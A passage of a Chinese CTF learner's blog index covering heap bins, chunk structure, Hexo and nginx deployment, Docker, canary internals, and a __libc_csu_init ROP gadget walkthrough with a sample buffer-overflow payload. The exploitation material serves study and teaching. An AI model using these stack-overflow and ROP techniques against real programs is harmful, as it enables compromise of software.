bin中， 前32个大bin按以64字节步长为间隔，即第一个大bin中chunk大小为512〜575字节，第二个大bin中chunk大小为576〜 639字节。紧随其后的16个大bin先以512字节步长为间隔； 之后的8个bin以步长4096为间隔； 再之后的4个bin以32768字节为间隔； 之后的2个bin以262144字节为间隔； 剩下的chunk就放在最后一个大bin中。 FIFO 内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk","categories":[{"name":"堆","slug":"堆","permalink":"https://www.zzl14.xyz/categories/堆/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://www.zzl14.xyz/tags/堆/"},{"name":"bin","slug":"bin","permalink":"https://www.zzl14.xyz/tags/bin/"},{"name":"linux","slug":"linux","permalink":"https://www.zzl14.xyz/tags/linux/"},{"name":"malloc","slug":"malloc","permalink":"https://www.zzl14.xyz/tags/malloc/"}]},{"title":"chunk结构","slug":"chunk结构","date":"2020-04-07T06:26:52.000Z","updated":"2020-04-09T03:39:54.260Z","comments":true,"path":"2020/04/07/chunk结构/","link":"","permalink":"https://www.zzl14.xyz/2020/04/07/chunk结构/","excerpt":"","text":"内存堆块结构 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示 结构定义如下 123456789101112struct malloc_chunk &#123;INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */struct malloc_chunk* fd; /* double links -- used only if free. */struct malloc_chunk* bk;/* Only used for large blocks: pointer to next larger size. */struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */struct malloc_chunk* bk_nextsize;&#125;; prev_size仅在前一个堆块（较低地址）是free状态才生效。 size指的是本chunk的大小即为图中chunk到nextchunk的大小 fd是指向下一个（非物理相邻）被free的 chunk bk 指向上一个（非物理相邻）被free的 chunk fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块 简单来讲chunk分为正在使用的chunk：allocated chunk和被free的chunk:free chunk 正在使用的chunk如图所示，数据从fd开始写，可能写到下一个chunk的prev_use位 可以说除了size，其他字段都用来写数据，在chunk被free才会发挥各个字段的作用 各部分详解 prev_size只有当该chunk的物理相邻的前一地址chunk是空闲的话，该字段在本chunk中才有用，用来记录前一个chunk 的大小 (包括chunk头)。只有chunk 被free空闲的时候才使用，如果前一个chunk未被free，前一个chunk可以覆写到presize位，正如图中所示，chunk可以写内容（user data）到下一个堆块的pre_size 这就是 chunk 中的空间复用 这样看起来好像size位才是chunk的开始。？ 但是chunk块的地址从这里开始 size记录当前chunk的大小,大小一般是 2 * SIZE_SZ 的最小整数倍。 若malloc(n) 则size=(n+SIZE_SZ)再补齐， 我是看做data部分大小加上size位的大小再补齐 SIZE_SZ= 4（32位系统）或8（64位系统） 另外size后三位有特殊用途，所以size的真正大小要将后三位取0 NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。 IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。 fd，bk malloc成功时返回的地址就是fd的地址 chunk 处于分配状态时，从 fd 字段开始是用户的数据,chunk 被free后才发挥作用 fd 指向下一个（非物理相邻）空闲的 chunk bk 指向上一个（非物理相邻）空闲的 chunk fd_nextsize， bk_nextsizechunk 被free的时候才使用，用于large chunk。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。","categories":[{"name":"堆","slug":"堆","permalink":"https://www.zzl14.xyz/categories/堆/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.zzl14.xyz/tags/linux/"},{"name":"malloc","slug":"malloc","permalink":"https://www.zzl14.xyz/tags/malloc/"},{"name":"chunk结构","slug":"chunk结构","permalink":"https://www.zzl14.xyz/tags/chunk结构/"}]},{"title":"hexo Butterfly主题配置及部署到服务器","slug":"hexo主题搭建","date":"2020-04-06T06:19:15.000Z","updated":"2020-04-06T13:03:03.102Z","comments":true,"path":"2020/04/06/hexo主题搭建/","link":"","permalink":"https://www.zzl14.xyz/2020/04/06/hexo主题搭建/","excerpt":"","text":"安装Butterfly主题与配置12这个主题还是很不错的，我花了一个多礼拜的时间来搞。说明：我安装的是2.0.0版本的，因为以上版本我本地'hexo g'会出错 主题安装资源链接 直接点击下载比git clone要快的多，下载后解压到hexo themes目录下 我主要将一些问题，配置说一下，要具体配置看相关博文链接 hexo各目录作用123456789101112.├── _config.yml // 站点配置文件├── db.json // 缓存文件├── node_modules // 安装的插件以及hexo所需的一些nodejs模块├── package.json // 项目的依赖文件├── scaffolds // 模版文件 -draft.md -page.md -post.md├── source // 源文件，用来存放你的文章 md 文件 -_posts└── themes // 主题文件 hexo new 默认是post.md，一般放在source中_posts目录，我们写作的博客都在这里。 ​ 可以在post.md中设置自动生成的博客的格式 主题下载到themes目录下 主题目录12345678910.├── LICENSE├── README.en.md // READEME 英文版├── README.md // READEME 中文文件├── _config.yml // 主题配置文件├── languages // 多语言配置文件 可以在hexo的_config.yml中配置├── layout // 模板文件├── package.json // 项目的依赖文件├── scripts // 主题的脚本文件├── source // 主题的资源文件 CSS IMG Hexo 的工作原理12345678hexo g： 生成静态文件。 将我们的数据和界面相结合生成静态文件的过程。 会遍历主题文件中的 source 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 pubild 文件夹中，此时的 public 文件是由 html、 js、css、img 建立的纯静态文件可以通过 index.html 作为入口访问你的博客。hexo d： 部署文件。 部署主要是根据在 _config.yml 中配置的 git 仓库或者 coding 的地址，将 public 文件上传至 github 或者 coding 中。 然后再根据上面的 github 提供的 pages 服务呈现出页面。当然你也可以直接将你生成的 public 文件上传至你自己的服务器上。 hexo大概就是将本地的文件，经过加工生成html文件。最后可上传到github或服务器上进行访问 主题配置菜单的配置 123:前面是显示的菜单名称|| 后面写图标名称 菜单图标可在网址里找 https://fontawesome.com/?from=io 列表下面那种是分级目录 创建page tag等刚开始，标签，分类，友链等都是没有界面的，所以用到命令 hexo new page &#39;name&#39; 在hexo主目录中输入命令，会在source下出现相应目录 tags的配置 1234title: 标签date: 2020-04-03 16:20:50type: \"tags\"top_img: top_img可以设置对应菜单下的图片,可以用图床生成图片链接 link的配置 1234title: linkdate: 2020-04-05 17:34:13type: \"link\"top_img: https://i.loli.net/2020/04/05/hDjZveqHTd1LWsI.png categories的配置 1234title: 分类date: 2020-04-03 16:20:21type: \"categories\"top_img: 友链的设置在hexo的source目录生成 _data里面生成link.yml文件 文件内容 12345678910111213class: class_name: 友情链接 link_list: 1: name: #名称 link: #博客链接 avatar: #头像 descr: #描述 2: name: link: avatar: descr: 另外在主题的配置文件中Flink下设置自己的资料 123456789# 友情鏈接界面設置Flink: headline: 友情链接 info_headline: 我的Blog资料 name: Blog 名字： zzl14 address: Blog 地址： https://www.zzl14.xyz/link/ avatar: Blog 主题： Butterfly info: Blog 简介： 日常学习总结 comment: 交换友链,请留言 界面如下 文章的图片设置123456title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;category: &#123;&#123; category &#125;&#125;tags:top_img: #文章顶部图片路径cover: #封面路径 搜索框的设置1234local_search: enable: true #主题配置中设置为true,并在hexo主目录使用如下命令下载依赖， npm install hexo-generator-search --save 具体配置过程可能艰辛，但是慢慢来。 相关博文链接详细博文1 详细博文2 系列博文 hexo部署到服务器由于github仓库的访问速度可能较慢，可能有必要搭建到服务器上进行访问。 但是之后感觉其实没有太大必要 先放一幅原理图（别人博客的） 所以我们需要在服务器搭建git仓库，下载Nginx，通过hooks将仓库部署到网站 大致思路是 1.本地上传到服务器的git仓库 2.通过git仓库的hooks（钩子）将文件放到服务器的网站根目录（自己设置） 3.通过Nginx将网站根目录的内容在公网ip进行展示 安装nginx 创建git用户 安装Nginx12345ssh root@ip #登录服务器sudo apt-get install nginx (有时要用到 sudo apt-get update) # 或者sudo apt-get install apache2 新建git用户1sudo adduser git #新建git用户，下面会输入 建立服务器端git仓库 可以在hexo bash上上传到仓库 12345$ sudo mkdir /zzl # 创建个人git目录$ cd /zzl$ sudo mkdir blog.git # 创建仓库$ cd blog.git$ sudo git init --bare # 初始化仓库 建立网站根目录1$ sudo mkdir -p /home/git/hexo 改目录权限 因为在hexo的配置文件中repo选项是通过git进行上传 所以要把目录权限给到git，并将用户目录权限改为775，即允许git用户写入 12$ sudo chown -R git:git /zzl /home/git/hexochmod -R git 775$ chmod -R git 775 编辑hook函数 将上传到仓库的文件转到网站根目录 1$ vim /zzl/blog.git/hooks/post-receive 填入以下内容 12#!/bin/shgit --work-tree=/home/git/hexo --git-dir=/zzl/blog.git checkout -f 在本地hexo bash测试1git clone git@your_server_ip:/zzl/blog.git 如果提示你克隆了一个空仓库，代表成功 但是每次都要输入密码才能上传 这时候我们就要用到rsa加密进行身份验证，以后就不用输入密码 配置ssh1234cd /home/git #进到git目录su git //切换git用户mkdir /home/git/.ssh vi /home/git/.ssh/authorized_keys #输入公钥 在之前的hexo与github仓库绑定时应该已经生成过 我们可以再生成一次用来查看密钥位置 ssh-keygen -t rsa 会发现目录下有id_rsa.pub即公钥 将公钥内容输入/home/git/.ssh/authorized_keys 最后在hexo bash 输入一下命令，如果不再输入密码，即配置成功 ssh git@ip 配置网站根目录nginx -t //查看nginx配置文件位置 ubuntu 1vim /etc/nginx/sites-available/default centos 1vim /etc/nginx/conf.d/blog.conf 不同版本的nginx或系统，nginx的配置文件不一定相同 如果文件中有以下内容，就找对了文件 1234567891011server &#123; listen 80; listen [::]:80; root /hexo/git/hexo; # 修改的地方,改为设置的网站根目录的路径 server_name laoyuyu.me www.laoyuyu.me; # 如果需要改域名访问，修改server_name 为域名便可 location / &#123; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; &#125;&#125; 最后重启服务，让NGINX生效1service nginx restart 此时访问自己的ip可能出现403的情况，可能是因为没有上传东西。 编辑hexo _config.yml文件 1234deploy:type: git #用户名repo: git@ip:/zzl/blog.git #Git仓库地址，ip为公网ip :符号后为Git仓库服务器路径branch: master #分支，由于我们只用Git进行发布，master即可。 hexo d上传之后再访问ip就可以了 最后说一下git用户的权限更改 为了安全考虑,更改GIT用户的SHELL 权限123which git-shell #返回git-shell的安装目录，如：/usr/bin/git-shellcat /etc/shells #如果文件不存在或没有/usr/bin/git-shell，则需要使用vim增加路径sudo vim /etc/shells 1234567/bin/sh/bin/dash/bin/bash/bin/rbash/usr/bin/tmux/usr/bin/screen/usr/bin/git-shell # 添加你的git-shell vim /etc/passwd 找到类似/home/git:/bin/bash 更改/bin/bash修改为/usr/bin/git-shell 千万不要将root的/bin/bash修改，否则之后服务器就无法登录 End配置挺难，但最后总算学到了什么。 配置hexo到服务器的链接 ssh相关 博文一 博文2 博文3 博文4 nginx 403错误 nginx 403错误2 nginx重装等命令","categories":[{"name":"搭建博客","slug":"搭建博客","permalink":"https://www.zzl14.xyz/categories/搭建博客/"}],"tags":[{"name":"Butterfly","slug":"Butterfly","permalink":"https://www.zzl14.xyz/tags/Butterfly/"},{"name":"hexo","slug":"hexo","permalink":"https://www.zzl14.xyz/tags/hexo/"},{"name":"nginx","slug":"nginx","permalink":"https://www.zzl14.xyz/tags/nginx/"},{"name":"git","slug":"git","permalink":"https://www.zzl14.xyz/tags/git/"},{"name":"ssh","slug":"ssh","permalink":"https://www.zzl14.xyz/tags/ssh/"}]},{"title":"docker基础","slug":"docker配置","date":"2020-02-16T06:19:15.000Z","updated":"2020-04-06T13:19:12.926Z","comments":true,"path":"2020/02/16/docker配置/","link":"","permalink":"https://www.zzl14.xyz/2020/02/16/docker配置/","excerpt":"","text":"什么是DOCKER别人的吐血总结 1Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。 针对简单操作理解一下DOCKER 拉取一个 DOCKER 镜像，我们可以用如下命令： 1docker pull image_name image_name就是指的镜像 pull就是拉取一个镜像 12Docker镜像 可以看作是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 如何安装DOCKER?docker rmi image_name 删除镜像 docker run --name container-name -d image-name 运行容器 --name：自定义容器名 -d：表示后台运行 docker ps（查看运行中的容器）； 加上-a；可以查看所有容器 docker stop container-name/container-id 停止当前运行的指定容器 启动 docker start container-name/container-id 启动容器 删除 docker rm container-id 删除指定容器 端口映射 -p 6379:6379 如:docker run --name myredis -d -p 6379:6379 docker.io/redis -p:主机端口映射到容器内部的端口 docker中run和start的区别 docker run 后面指定的是一个镜像 而docker start指定的是一个容器 docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 #实例运行、 运行交互式的容器 sudo docker run -i -t skysider/pwndocker /bin/bash -t: 在新容器内指定一个伪终端或终端。 -i: 允许你对容器内的标准输入 (STDIN) 进行交互。​停止容器​ docker stop exit 命令或者使用 CTRL+D 来退出容器。 后台启动容器 sudo docker run -itd skysider/pwndocker /bin/bash -d 参数时，容器启动后会进入后台 -i: 允许你对容器内的标准输入 (STDIN) 进行交互。 -t: 在新容器内指定一个伪终端或终端。docker ps 查看 在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入： docker attach docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。 例如 docker attach 4b6771050406 docker exec -it b26d4f3e2cac /bin/bash 删除容器使用 docker rm 命令： docker rm -f 1e560fca3906docker images 查看镜像REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小我们可以从 Docker Hub 网站来搜索镜像 面是一段简单的Dockerfile的例子： FROM python:2.7 MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt; COPY . /app WORKDIR /app RUN pip install -r requirements.txt EXPOSE 5000 ENTRYPOINT [&quot;python&quot;] CMD [&quot;app.py&quot;] 我们可以分析一下上面这个过程： 1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像 2、显示维护者的信息 3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt; 4、指定工作路径为 /app 5、安装依赖包 6、暴露 5000 端口 7、启动 app 这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。","categories":[{"name":"docker","slug":"docker","permalink":"https://www.zzl14.xyz/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://www.zzl14.xyz/tags/docker/"}]},{"title":"虚拟机配置","slug":"虚拟机配置","date":"2019-11-15T08:10:08.000Z","updated":"2019-11-15T08:20:00.397Z","comments":true,"path":"2019/11/15/虚拟机配置/","link":"","permalink":"https://www.zzl14.xyz/2019/11/15/虚拟机配置/","excerpt":"","text":"#今天讲的是pwndbg的一些基本操作 1.首先下载Ubuntuhttps://blog.csdn.net/kwame211/article/details/83902851 2.安装VMtools https://blog.csdn.net/zxf1242652895/article/details/78203473 123安装时会出现很多提示 输入yes/no 都选 yes，如果提示 的是 路径， 则直接回车就好。 3.更换软件源 123源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，相当于软件的下载服务器和更新服务器，只不过不是某款软件的，而是该系统所有软件的下载服务器 https://blog.csdn.net/meteor_s/article/details/81301252 4.安装pip pip 是“A tool for installing and managing Python packages.”，也就是说pip是python的软件安装工具 安装直接在终端输入： sudo apt install python-pip 5.更改pip源我们在进行Python开发时，经常会通过pip操作来安装一些packages，但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的 创建一个配置文件 1234sudo mkdir ~/.pip/cd ./.pip/touch pip.confsudo gedit pip.conf 按照链接更改配置文件https://blog.csdn.net/yuzaipiaofei/article/details/80891108 6.安装pwntools https://www.cnblogs.com/cai00/p/10696728.html 7.安装pwndbghttps://blog.csdn.net/kevin66654/article/details/86773517","categories":[],"tags":[{"name":"虚拟机配置","slug":"虚拟机配置","permalink":"https://www.zzl14.xyz/tags/虚拟机配置/"}]},{"title":"canary","slug":"canary","date":"2019-11-08T11:17:20.000Z","updated":"2019-11-08T11:24:16.636Z","comments":true,"path":"2019/11/08/canary/","link":"","permalink":"https://www.zzl14.xyz/2019/11/08/canary/","excerpt":"","text":"资源链接https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/ Canary Introduction 由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。 canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生. Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配 Canary 原理 在 GCC 中使用 Canary 可以在 GCC 中使用以下参数设置 Canary: 12345-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护. Canary 实现原理 开启 Canary 保护的 stack 结构大概如下 1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | canary value | +-----------------+ | 局部变量 | Low | | Address 当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下： 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。 1234mov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 如果 canary 已经被非法修改，此时程序流程会走到 stack_chk_fail。stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。 1234567891011121314eglibc-2.19/debug/stack_chk_fail.cvoid __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125; 这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。 进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ...&#125; tcbhead_t; 如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。事实上，TLS 中的值由函数 security_init 进行初始化。 12345678910111213141516171819static voidsecurity_init (void)&#123; // _dl_random的值在进入这个函数的时候就已经由kernel写入. // glibc直接使用了_dl_random的值并没有给赋值 // 如果不采用这种模式, glibc也可以自己产生随机数 //将_dl_random的最后一个字节设置为0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random); // 设置Canary的值到TLS中 THREAD_SET_STACK_GUARD (stack_chk_guard); _dl_random = NULL;&#125;//THREAD_SET_STACK_GUARD宏用于设置TLS#define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)","categories":[],"tags":[{"name":"保护机制","slug":"保护机制","permalink":"https://www.zzl14.xyz/tags/保护机制/"}]},{"title":"链接","slug":"链接","date":"2019-11-05T09:20:49.000Z","updated":"2019-11-05T09:20:49.405Z","comments":true,"path":"2019/11/05/链接/","link":"","permalink":"https://www.zzl14.xyz/2019/11/05/链接/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"通用gadget原理分析","slug":"通用gadget原理分析","date":"2019-11-01T12:09:47.000Z","updated":"2019-11-01T14:03:03.115Z","comments":true,"path":"2019/11/01/通用gadget原理分析/","link":"","permalink":"https://www.zzl14.xyz/2019/11/01/通用gadget原理分析/","excerpt":"","text":"通用 gadget __libc_csu_init() 我们知道在程序编译的过程中，会自动加入一些通用函数做初始化的工作，这些初始化函数都是相同的，所以我们可以考虑在这些函数中找到一些通用的 gadget，在 x64 程序中，就存在这样的 gadget。x64 程序的前六个参数依次通过寄存器 rdi、rsi、rdx、rcx、r8、r9 进行传递，我们所找的 gadget 自然也是针对这些寄存器进行操作的。 函数 __libc_csu_init() 用于对 libc 进行初始化，只要程序调用了 libc，就一定存在这个函数。由于每个版本的 libc 都有一定区别，这里的版本如下： 12$ file /usr/lib/libc-2.26.so/usr/lib/libc-2.26.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86-64.so.2, BuildID[sha1]=f46739d962ec152b56d2bdb7dadaf8e576dbf6eb, for GNU/Linux 3.2.0, not stripped 12345678910111213141516171819202122232425262728293031323334353637gdb-peda$ disassemble /r __libc_csu_initDump of assembler code for function __libc_csu_init: 0x00000000004007d0 &lt;+0&gt;: 41 57 push r15 0x00000000004007d2 &lt;+2&gt;: 41 56 push r14 0x00000000004007d4 &lt;+4&gt;: 49 89 d7 mov r15,rdx 0x00000000004007d7 &lt;+7&gt;: 41 55 push r13 0x00000000004007d9 &lt;+9&gt;: 41 54 push r12 0x00000000004007db &lt;+11&gt;: 4c 8d 25 16 06 20 00 lea r12,[rip+0x200616] # 0x600df8 0x00000000004007e2 &lt;+18&gt;: 55 push rbp 0x00000000004007e3 &lt;+19&gt;: 48 8d 2d 16 06 20 00 lea rbp,[rip+0x200616] # 0x600e00 0x00000000004007ea &lt;+26&gt;: 53 push rbx 0x00000000004007eb &lt;+27&gt;: 41 89 fd mov r13d,edi 0x00000000004007ee &lt;+30&gt;: 49 89 f6 mov r14,rsi 0x00000000004007f1 &lt;+33&gt;: 4c 29 e5 sub rbp,r12 0x00000000004007f4 &lt;+36&gt;: 48 83 ec 08 sub rsp,0x8 0x00000000004007f8 &lt;+40&gt;: 48 c1 fd 03 sar rbp,0x3 0x00000000004007fc &lt;+44&gt;: ff 15 f6 07 20 00 call QWORD PTR [rip+0x2007f6] # 0x600ff8 0x0000000000400802 &lt;+50&gt;: 48 85 ed test rbp,rbp 0x0000000000400805 &lt;+53&gt;: 74 1f je 0x400826 &lt;__libc_csu_init+86&gt; 0x0000000000400807 &lt;+55&gt;: 31 db xor ebx,ebx 0x0000000000400809 &lt;+57&gt;: 0f 1f 80 00 00 00 00 nop DWORD PTR [rax+0x0] 0x0000000000400810 &lt;+64&gt;: 4c 89 fa mov rdx,r15 0x0000000000400813 &lt;+67&gt;: 4c 89 f6 mov rsi,r14 0x0000000000400816 &lt;+70&gt;: 44 89 ef mov edi,r13d 0x0000000000400819 &lt;+73&gt;: 41 ff 14 dc call QWORD PTR [r12+rbx*8] 0x000000000040081d &lt;+77&gt;: 48 83 c3 01 add rbx,0x1 0x0000000000400821 &lt;+81&gt;: 48 39 dd cmp rbp,rbx 0x0000000000400824 &lt;+84&gt;: 75 ea jne 0x400810 &lt;__libc_csu_init+64&gt; 0x0000000000400826 &lt;+86&gt;: 48 83 c4 08 add rsp,0x8 0x000000000040082a &lt;+90&gt;: 5b pop rbx 0x000000000040082b &lt;+91&gt;: 5d pop rbp 0x000000000040082c &lt;+92&gt;: 41 5c pop r12 0x000000000040082e &lt;+94&gt;: 41 5d pop r13 0x0000000000400830 &lt;+96&gt;: 41 5e pop r14 0x0000000000400832 &lt;+98&gt;: 41 5f pop r15 0x0000000000400834 &lt;+100&gt;: c3 retEnd of assembler dump. 从中提取出两段（必须以ret结尾），把它们叫做 rop1 和 rop2： 12345670x000000000040082a &lt;+90&gt;: 5b pop rbx0x000000000040082b &lt;+91&gt;: 5d pop rbp0x000000000040082c &lt;+92&gt;: 41 5c pop r120x000000000040082e &lt;+94&gt;: 41 5d pop r130x0000000000400830 &lt;+96&gt;: 41 5e pop r140x0000000000400832 &lt;+98&gt;: 41 5f pop r150x0000000000400834 &lt;+100&gt;: c3 ret 1234567891011121314150x0000000000400810 &lt;+64&gt;: 4c 89 fa mov rdx,r15 0x0000000000400813 &lt;+67&gt;: 4c 89 f6 mov rsi,r14 0x0000000000400816 &lt;+70&gt;: 44 89 ef mov edi,r13d 0x0000000000400819 &lt;+73&gt;: 41 ff 14 dc call QWORD PTR [r12+rbx*8] 0x000000000040081d &lt;+77&gt;: 48 83 c3 01 add rbx,0x1 0x0000000000400821 &lt;+81&gt;: 48 39 dd cmp rbp,rbx 0x0000000000400824 &lt;+84&gt;: 75 ea jne 0x400810 &lt;__libc_csu_init+64&gt; 0x0000000000400826 &lt;+86&gt;: 48 83 c4 08 add rsp,0x8 0x000000000040082a &lt;+90&gt;: 5b pop rbx 0x000000000040082b &lt;+91&gt;: 5d pop rbp 0x000000000040082c &lt;+92&gt;: 41 5c pop r12 0x000000000040082e &lt;+94&gt;: 41 5d pop r13 0x0000000000400830 &lt;+96&gt;: 41 5e pop r14 0x0000000000400832 &lt;+98&gt;: 41 5f pop r15 0x0000000000400834 &lt;+100&gt;: c3 ret 我们可以看到rop1 中连续六个 pop，可以将栈顶的六个值传入pop rbx_rbp_r12_r13_r14_r15 rop2中可以传递寄存器的值rdx(r13), rsi(r14), edi(r15d) rdi,rsi,rdx正好是64位传参的前三个寄存器因此我们可以借此gadget给某个函数传入参数控制程序，接下来我分析一下利用gadget的流程。 用我最近做的一个题的payload来说明payload如下： 123\"a\" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)+ + p64(rop2)+\"\\x00\" * 56+p64(start_addr)+payload.ljust(200, \"a\") 首先是栈溢出到函数返回地址，填充为rop1的地址,后面加上六个参数，再加上rop2,再填充56个字节，最后加上函数start的地址。后面填充’a’到200完成payload的输入 仔细阅读rop1和rop2的汇编代码了解程序流程 1有个地方思考时很容易乱，就是程序执行流eip指向执行的是代码段，但是是在栈里对数据进行处理的。 首先payload输入后，执行rop1的汇编 12345678ret指令会 将rsp加8 则rsp会指向p64(0) 即覆盖的第一个参数将函数返回地址传给eip eip指向函数返回地址，即rop1的地址，程序开始执行rop1里的汇编代码 由rop1可知pop指令将参数传给各个寄存器中每次将栈里数据pop后rsp都会加上8如下： 123456rbx &lt;-- 0rbp &lt;-- 1r12 &lt;-- read_gotr13 &lt;-- 8r14 &lt;-- binsh_addrr15 &lt;-- 1 此时rsp指向了rop2，同样的，rop1的ret指令将 12eip &lt;-- rop2的地址rsp+=8; 指向了填充的56*'a' 开始执行rop2的汇编代码 123456rdx &lt;-- r15 &lt;-- 1rsi &lt;-- r14 &lt;-- binsh_addredi &lt;-- r13 &lt;-- 8将这三个参数传入了前三个寄存器中call QWORD PTR [r12+rbx*8]这句汇编就可以调用r12里的函数地址并将 上面寄存器的参数传给此函数 可以知道payload的调用函数为第三个参数传入函数的三个参数分别在payload传入的第6，5，4个参数 1234567891011121314151617接着add rbx,0x1 （rbx=1）cmp rbp,rbx (rbp=1,rbx=1)jne 0x400810 &lt;__libc_csu_init+64&gt;//有下面的指令解释可以知道相等不跳转所以继续执行下面的汇编add rsp,0x8pop rbx pop rbp pop r12 pop r13 pop r14 pop r15这几句将rsp+7*8就是加上了56由payload知道，此时rsp正好跳过了56*'a'指向了start函数的地址最后ret指令eip &lt;-- start地址 到这里通用gadget完成了一次调用 这个payload的作用就是调用了read函数读取内容到要填写binsh的地址并重新执行函数start 下面附上我手画的一张栈空间结构图，可以根据这个分析一下流程！ 12345678910111213141516指令cmp ax,bx 的逻辑含义是比较ax和bx的值，如果执行后：1. zf=1 ===&gt; (ax)=(bx)2. zf=0 ===&gt; (ax)!=(bx)3. cf=1 ===&gt; (ax)&lt;(bx)4. cf=0 ===&gt; (ax)&gt;=(bx)5. cf=zf=0 ===&gt; (ax)&gt;(bx)6. cf=1或zf=1 ===&gt; (ax)&lt;=(bx)cmp指令的比较结果需要通过条件转移指令来检测。|指令 |解释 |含义 |检测的相关标志位||-------|-------|-------|----------------||je|e:equal|等于则转移|zf=1||jne|ne:not equal|不等于则转移|zf=0||jb|b:below|低于则转移|cf=1||jnb|nb:not below| 不低于则转移| cf=0||ja |a:above| 高于则转移| cf=0且zf=0||jna| na:not above| 不高于则转移| 